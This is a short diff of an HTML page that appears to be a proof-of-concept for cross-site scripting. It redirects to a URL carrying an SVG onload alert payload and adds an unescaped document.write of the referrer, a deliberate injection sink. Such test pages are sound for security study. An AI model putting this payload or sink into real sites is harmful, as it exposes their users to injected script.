@@ -4,4 +4,5 @@ if (location.search==""){
 	window.location=document.location+"?<svg/onload=alert('XSS')>";
 }
 </script>
-<a style="font-size: 30px" href="https://renwax23.github.io/X/ier2.html">Click Here</a>
+You came from <script>document.write(document.referrer)</script>
+<a style="font-size: 30px" onclick=location.reload()>Click Here</a>
